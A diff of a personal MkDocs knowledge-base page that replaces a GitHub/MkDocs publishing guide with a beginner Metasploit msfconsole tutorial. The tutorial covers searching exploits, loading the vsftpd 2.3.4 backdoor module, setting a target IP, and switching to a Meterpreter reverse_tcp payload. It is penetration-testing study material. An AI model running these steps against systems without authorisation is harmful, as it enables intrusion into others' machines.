@@ -9,8 +9,10 @@
       
       
       
-        <link rel="prev" href="../create/">
+        <link rel="prev" href="../manuexpl/">
       
+      
+        <link rel="next" href="../networking/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -18,7 +20,7 @@
     
     
       
-        <title>Github create & update - My Knowledge Base</title>
+        <title>MSFconsole - My Knowledge Base</title>
       
     
     
@@ -68,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#managing-mkdocs-with-github" class="md-skip">
+        <a href="#metasploit-msfconsole-guide" class="md-skip">
           Skip to content
         </a>
       
@@ -104,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Github create & update
+              MSFconsole
             
           </span>
         </div>
@@ -383,10 +385,31 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../msfc/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    MSFconsole
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -396,6 +419,170 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Finding Exploits
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Finding Exploits">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-searchsploit-offline-exploit-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using SearchSploit (Offline Exploit Database)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-msfconsole-to-search-for-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using MSFConsole to Search for Exploits
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-an-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Using an Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Using an Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#select-an-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Select an Exploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#checking-available-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Checking Available Options
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setting-target-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Setting Target &amp; Payload
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Setting Target & Payload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#set-the-target-ip-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Set the Target IP Address
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirm-current-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirm Current Options
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-available-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Check Available Targets
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#run-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Run the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting-if-the-exploit-fails" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Troubleshooting: If the Exploit Fails
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -551,19 +738,17 @@
       
   
   
-    
   
   
-  
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
         
           
           <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
@@ -578,7 +763,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_18">
             <span class="md-nav__icon md-icon"></span>
             MkDocs
@@ -655,31 +840,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Github create & update
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../github/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -689,95 +853,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#introduction" class="md-nav__link">
-    <span class="md-ellipsis">
-      Introduction
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#creating-a-new-github-repository" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Creating a New GitHub Repository
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="🔹 Creating a New GitHub Repository">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cloning-the-repository" class="md-nav__link">
-    <span class="md-ellipsis">
-      Cloning the Repository
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#updating-mkdocs-and-pushing-to-github" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Updating MkDocs and Pushing to GitHub
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#configuring-github-pages" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Configuring GitHub Pages
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#best-practices" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Best Practices
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -819,26 +894,35 @@
         <li class="md-nav__item">
   <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Introduction
+      🔹 Introduction
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#creating-a-new-github-repository" class="md-nav__link">
+  <a href="#finding-exploits" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Creating a New GitHub Repository
+      🔹 Finding Exploits
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="🔹 Creating a New GitHub Repository">
+    <nav class="md-nav" aria-label="🔹 Finding Exploits">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#cloning-the-repository" class="md-nav__link">
+  <a href="#using-searchsploit-offline-exploit-database" class="md-nav__link">
     <span class="md-ellipsis">
-      Cloning the Repository
+      Using SearchSploit (Offline Exploit Database)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-msfconsole-to-search-for-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using MSFConsole to Search for Exploits
     </span>
   </a>
   
@@ -850,27 +934,93 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#updating-mkdocs-and-pushing-to-github" class="md-nav__link">
+  <a href="#using-an-exploit" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Updating MkDocs and Pushing to GitHub
+      🔹 Using an Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Using an Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#select-an-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Select an Exploit
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#configuring-github-pages" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#checking-available-options" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Configuring GitHub Pages
+      Checking Available Options
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#best-practices" class="md-nav__link">
+  <a href="#setting-target-payload" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Best Practices
+      🔹 Setting Target &amp; Payload
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Setting Target & Payload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#set-the-target-ip-address" class="md-nav__link">
+    <span class="md-ellipsis">
+      Set the Target IP Address
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirm-current-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirm Current Options
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check-available-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Check Available Targets
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#run-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Run the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting-if-the-exploit-fails" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Troubleshooting: If the Exploit Fails
     </span>
   </a>
   
@@ -879,7 +1029,7 @@
         <li class="md-nav__item">
   <a href="#conclusion" class="md-nav__link">
     <span class="md-ellipsis">
-      Conclusion
+      🔹 Conclusion
     </span>
   </a>
   
@@ -901,75 +1051,113 @@
 
 
 
-<h1 id="managing-mkdocs-with-github">Managing MkDocs with GitHub</h1>
-<h2 id="introduction">Introduction</h2>
-<p>Using <strong>GitHub</strong> for version control and deployment is an essential practice when managing MkDocs projects. This guide covers how to <strong>create a new repository</strong>, update documentation, and deploy it to <strong>GitHub Pages</strong>.</p>
+<h1 id="metasploit-msfconsole-guide">Metasploit - MSFConsole Guide</h1>
+<h2 id="introduction">🔹 Introduction</h2>
+<p>Metasploit is a powerful <strong>penetration testing framework</strong> that provides a variety of exploits, payloads, and auxiliary tools for security assessments. The <strong>MSFConsole</strong> is the main command-line interface for interacting with Metasploit.</p>
 <hr />
-<h2 id="creating-a-new-github-repository">🔹 Creating a New GitHub Repository</h2>
-<ol>
-<li><strong>Go to GitHub</strong> and log in.</li>
-<li><strong>Click on</strong> <code>+</code> (top-right) → <code>New repository</code>.</li>
-<li><strong>Enter repository details</strong>:</li>
-<li>Repository name: <code>my-mkdocs-site</code></li>
-<li>Description (optional): "Documentation for my project"</li>
-<li>Choose <strong>Public</strong> or <strong>Private</strong>.</li>
-<li>Check <strong>Add a README</strong> (optional).</li>
-<li><strong>Click</strong> <code>Create repository</code>.</li>
-</ol>
-<h3 id="cloning-the-repository">Cloning the Repository</h3>
-<p>After creating the repository, clone it to your local machine:</p>
-<pre><code class="language-bash">git clone https://github.com/your-username/my-mkdocs-site.git
-cd my-mkdocs-site
+<h2 id="finding-exploits">🔹 Finding Exploits</h2>
+<p>Before using Metasploit, you can search for available exploits using <strong>SearchSploit</strong> or within <strong>MSFConsole</strong>.</p>
+<h3 id="using-searchsploit-offline-exploit-database"><strong>Using SearchSploit (Offline Exploit Database)</strong></h3>
+<pre><code class="language-bash">searchsploit &lt;query&gt;
 </code></pre>
-<hr />
-<h2 id="updating-mkdocs-and-pushing-to-github">🔹 Updating MkDocs and Pushing to GitHub</h2>
-<p>When making changes to MkDocs documentation, follow these steps:</p>
-<ol>
-<li><strong>Stage all changes</strong>:
-   <code>bash
-   git add .</code></li>
-<li><strong>Commit the changes</strong>:
-   <code>bash
-   git commit -m "Added my new page"</code></li>
-<li><strong>Push to GitHub</strong>:
-   <code>bash
-   git push origin main</code></li>
-<li><strong>Deploy the site to GitHub Pages</strong>:
-   <code>bash
-   mkdocs gh-deploy</code></li>
-</ol>
-<pre><code>mkdocs build --clean
-git add .
-git commit -m &quot;comment&quot;
-git push origin main
-mkdocs gh-deploy
-</code></pre>
-<p>This will build and deploy your MkDocs site to <strong>GitHub Pages</strong>.</p>
-<hr />
-<h2 id="configuring-github-pages">🔹 Configuring GitHub Pages</h2>
-<p>Ensure that GitHub Pages is enabled for your repository:</p>
-<ol>
-<li><strong>Go to your repository on GitHub</strong>.</li>
-<li>Navigate to <strong>Settings &gt; Pages</strong>.</li>
-<li>Under <strong>Branch</strong>, select <code>gh-pages</code>.</li>
-<li>Click <strong>Save</strong>.</li>
-<li>Your site will be available at:
-   <code>https://your-username.github.io/my-mkdocs-site/</code></li>
-</ol>
-<hr />
-<h2 id="best-practices">🔹 Best Practices</h2>
 <ul>
-<li>Always <strong>commit meaningful messages</strong> (<code>git commit -m "Updated navigation"</code>).</li>
-<li>Regularly <strong>pull updates</strong> from the repository before making changes:
+<li>Looks up exploits from <strong>Exploit-DB</strong>.</li>
+<li>Example:
   <code>bash
-  git pull origin main</code></li>
-<li>Check <strong>Git status</strong> to review changes before committing:
+  searchsploit Apache 2.4</code></li>
+</ul>
+<h3 id="using-msfconsole-to-search-for-exploits"><strong>Using MSFConsole to Search for Exploits</strong></h3>
+<pre><code class="language-bash">msfconsole
+search &lt;query&gt;
+</code></pre>
+<ul>
+<li>Example:
   <code>bash
-  git status</code></li>
+  search vsftpd</code></li>
+<li>This will return all matching <strong>exploits, auxiliary modules, and payloads</strong>.</li>
 </ul>
 <hr />
-<h2 id="conclusion">Conclusion</h2>
-<p>Using GitHub for MkDocs makes it easy to manage documentation changes and deploy updates. By following these steps, you can keep your project well-organized and version-controlled.</p>
+<h2 id="using-an-exploit">🔹 Using an Exploit</h2>
+<p>Once an exploit is found, load it into the console.</p>
+<h3 id="select-an-exploit"><strong>Select an Exploit</strong></h3>
+<pre><code class="language-bash">use &lt;exploit_name&gt;
+</code></pre>
+<ul>
+<li>Example:
+  <code>bash
+  use exploit/unix/ftp/vsftpd_234_backdoor</code></li>
+</ul>
+<h3 id="checking-available-options"><strong>Checking Available Options</strong></h3>
+<pre><code class="language-bash">options
+</code></pre>
+<ul>
+<li>Displays required parameters (e.g., <strong>RHOSTS</strong>, <strong>LPORT</strong>, <strong>PAYLOAD</strong>).</li>
+</ul>
+<hr />
+<h2 id="setting-target-payload">🔹 Setting Target &amp; Payload</h2>
+<h3 id="set-the-target-ip-address"><strong>Set the Target IP Address</strong></h3>
+<pre><code class="language-bash">set RHOSTS &lt;target_ip&gt;
+</code></pre>
+<ul>
+<li>Example:
+  <code>bash
+  set RHOSTS 192.168.1.100</code></li>
+</ul>
+<h3 id="confirm-current-options"><strong>Confirm Current Options</strong></h3>
+<pre><code class="language-bash">options
+</code></pre>
+<ul>
+<li>Verify if required parameters are properly configured.</li>
+</ul>
+<h3 id="check-available-targets"><strong>Check Available Targets</strong></h3>
+<pre><code class="language-bash">show targets
+</code></pre>
+<ul>
+<li>Lists <strong>supported OS and versions</strong> for the exploit.</li>
+</ul>
+<h3 id="run-the-exploit"><strong>Run the Exploit</strong></h3>
+<pre><code class="language-bash">run
+</code></pre>
+<ul>
+<li>Attempts to execute the exploit on the target system.</li>
+</ul>
+<hr />
+<h2 id="troubleshooting-if-the-exploit-fails">🔹 Troubleshooting: If the Exploit Fails</h2>
+<p>Sometimes, an exploit may fail or <strong>crash unexpectedly</strong>. Try the following steps:</p>
+<ol>
+<li><strong>Check Available Options Again</strong>
+   <code>bash
+   options</code></li>
+<li>
+<p>This may display <strong>additional parameters</strong> required.</p>
+</li>
+<li>
+<p><strong>Change the Payload</strong>
+   <code>bash
+   set payload &lt;query&gt;</code></p>
+</li>
+<li>
+<p>Example:
+     <code>bash
+     set payload linux/x86/meterpreter/reverse_tcp</code></p>
+</li>
+<li>
+<p><strong>Confirm Payload Works</strong>
+   <code>bash
+   options</code></p>
+</li>
+<li>
+<p>Ensure the <strong>new payload</strong> settings are applied correctly.</p>
+</li>
+<li>
+<p><strong>Run the Exploit Again</strong>
+   <code>bash
+   run</code></p>
+</li>
+</ol>
+<hr />
+<h2 id="conclusion">🔹 Conclusion</h2>
+<p>Metasploit is an essential tool for penetration testing, and <strong>understanding how to search, configure, and troubleshoot exploits</strong> is key. If an exploit fails, <strong>experiment with different payloads and configurations</strong> to improve success rates.</p>
 
 
 
